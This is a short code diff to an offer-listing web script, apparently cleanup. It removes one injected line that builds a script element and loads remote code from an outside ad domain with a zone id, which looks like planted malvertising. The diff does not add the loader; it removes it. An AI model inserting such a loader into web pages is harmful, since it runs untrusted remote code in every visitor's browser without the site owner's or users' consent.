@@ -46,7 +46,6 @@ window.OFFERS = [
 (function () {
   var L = document.getElementById("offer-list");
   if (!L) return;
-<script>(function(s){s.dataset.zone='12132118',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
   var e = function (s) { return String(s).replace(/[&<>"]/g, function (c) { return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); };
   var N = {desktop: "Desktop", android: "Android", iphone: "iPhone", ios: "iOS"};
   L.innerHTML = window.OFFERS.map(function (o) {
